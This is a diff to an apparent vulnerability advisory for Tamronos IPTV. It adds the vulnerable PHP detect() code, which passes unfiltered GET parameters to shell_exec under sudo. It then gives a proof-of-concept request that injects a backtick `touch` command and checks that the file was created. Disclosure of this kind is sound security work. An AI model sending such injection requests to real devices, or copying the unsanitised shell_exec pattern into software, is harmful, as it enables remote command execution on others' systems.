@@ -8,9 +8,18 @@ official website：http://www.tamronos.com/
 
 The detect() method in the `iptv/Controllers/MptsController.php` file does not perform filtering verification on the `$_GET['address']` , `$_GET['ip']` passed in by the user. Instead, it is directly passed into function shell_exec() and can be used `` Truncating the command resulted in command injection.
 
-![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/827c19e3-0f8f-40bd-a1b0-1e6f00620fe7)
+![detect](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/detect.jpg)
 
+Code:
+```
+    public function detect(){
 
+        $file = '/tmp/mptsdetect.log';
+        Command::rm($file);
+        $cmd = sprintf('/usr/bin/sudo /usr/bin/dvblast -D %s/udp/ifaddr=%s >null 2>%s &', $_GET['address'], $_GET['ip'], $file);
+        shell_exec($cmd);
+....
+```
 Access the /api/mpts/detect path to call the detect() method
 
 
@@ -23,11 +32,11 @@ request
 ```
 /api/mpts/detect?address=aaaa&ip=`touch+/cgi/public/js/aaa.txt`
 ```
-![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/bc9862dd-3322-4b76-b054-9ff87eabccdd)
+![request_detect](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/request_detect.jpg)
 
 访问http://localhost.com/js/aaa.txt
 
-![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/42362159-d64e-4f1b-9736-fbb72aa1caf3)
+![testok](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/.jpg)
 
 
 Test url
